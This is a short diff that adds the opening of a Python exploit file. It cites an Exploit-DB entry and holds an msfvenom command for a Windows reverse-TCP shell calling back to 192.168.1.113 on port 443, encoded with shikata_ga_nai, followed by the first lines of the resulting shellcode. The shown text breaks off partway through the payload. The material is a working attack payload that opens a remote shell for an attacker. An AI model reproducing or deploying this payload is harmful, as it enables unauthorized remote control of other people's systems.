@@ -1,0 +1,10 @@
+import _struct
+import array
+
+# https://www.exploit-db.com/exploits/40272/
+
+# msfvenom -p windows/shell_reverse_tcp -f python LHOST=192.168.1.113 LPORT=443 -e x86/shikata_ga_nai -b "\x00"
+buf =  ""
+buf += "\xd9\xcc\xd9\x74\x24\xf4\x5a\xbe\x29\x1c\x59\x1d\x33"
+buf += "\xc9\xb1\x52\x31\x72\x17\x83\xea\xfc\x03\x72\x84\xfc"
+buf += "\x7b\xdf\x73\x24\x2b\x91\xbf\xfb\x22\x5b\x5b\x2f\x3a"
